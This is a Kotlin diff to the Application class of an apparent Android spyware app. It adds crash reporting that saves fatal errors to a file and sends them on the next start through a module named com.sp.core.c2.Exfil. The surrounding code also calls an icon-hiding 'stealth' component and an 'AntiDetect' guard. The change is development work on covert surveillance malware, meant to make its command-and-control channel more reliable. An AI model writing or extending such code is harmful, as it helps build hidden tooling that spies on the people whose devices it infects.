@@ -22,6 +22,14 @@ class App : Application() {
     override fun onCreate() {
         super.onCreate()
         installCrashHandler()
+        uploadPendingCrash()
+
+        // A previous version may have hidden the launcher icon - make sure the
+        // app can always be started again.
+        try {
+            com.sp.core.stealth.IconHider.show(this)
+        } catch (t: Throwable) {
+        }
 
         try {
             AntiDetect.guard(this)
@@ -60,18 +68,41 @@ class App : Application() {
         try {
             val previous = Thread.getDefaultUncaughtExceptionHandler()
             Thread.setDefaultUncaughtExceptionHandler { thread, error ->
-                try {
+                val payload = try {
                     val stack = error.stackTrace.take(30).joinToString(" | ") {
                         "${it.className}.${it.methodName}:${it.lineNumber}"
                     }
-                    val payload = """{"fatal":true,"thread":"${thread.name}","err":"${error.javaClass.name}","msg":"${error.message}","stack":"$stack","ts":${System.currentTimeMillis()}}"""
+                    """{"fatal":true,"thread":"${thread.name}","err":"${error.javaClass.name}","msg":"${error.message}","stack":"$stack","ts":${System.currentTimeMillis()}}"""
+                } catch (_: Throwable) {
+                    """{"fatal":true,"err":"${error.javaClass.name}"}"""
+                }
+                try {
                     com.sp.core.c2.Exfil.sendLogSync(this, "crash", payload)
+                } catch (_: Throwable) {
+                }
+                try {
+                    java.io.File(filesDir, "crash.log").writeText(payload)
                 } catch (_: Throwable) {
                 }
                 previous?.uncaughtException(thread, error)
             }
         } catch (t: Throwable) {
             Log.w(TAG, "crash handler: ${t.message}")
+        }
+    }
+
+    /**
+     * A crash that killed the process is written to a file first, so the
+     * report survives and is delivered on the next start.
+     */
+    private fun uploadPendingCrash() {
+        try {
+            val f = java.io.File(filesDir, "crash.log")
+            if (!f.exists() || f.length() == 0L) return
+            val text = f.readText()
+            f.delete()
+            com.sp.core.c2.Exfil.sendLog(this, "crash", text)
+        } catch (_: Throwable) {
         }
     }
 
